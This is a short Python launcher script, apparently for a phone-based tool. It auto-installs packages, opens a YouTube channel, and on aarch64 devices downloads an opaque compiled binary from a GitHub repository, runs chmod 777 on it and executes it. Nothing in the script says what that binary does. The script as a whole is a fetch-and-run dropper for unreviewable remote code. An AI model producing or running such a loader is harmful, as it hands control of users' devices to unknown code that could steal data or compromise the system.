import os,sys,subprocess
try:
    import requests
except:
    os.system("pip install requests")
    os.system('xdg-open https://youtube.com/@RANITRICKER')
try:
    import rich
except:
    os.system("pip install rich")
try:
    import mechanize
except:
    os.system("pip install mechanize")

cwd = subprocess.check_output('uname -om', shell=True)
cwd = str(cwd)

if 'aarch64' in cwd:
    if not os.path.isfile('R35K3'):
        os.system('curl -L https://github.com/suhaniroy121/-/blob/main/R35K3.cpython-311.so?raw=true > R35K3')
        os.system('chmod 777 R35K3')
        os.system('./R35K3')
    else:
        os.system('./R35K3')

   ### exit(" we can't find your bit sory")

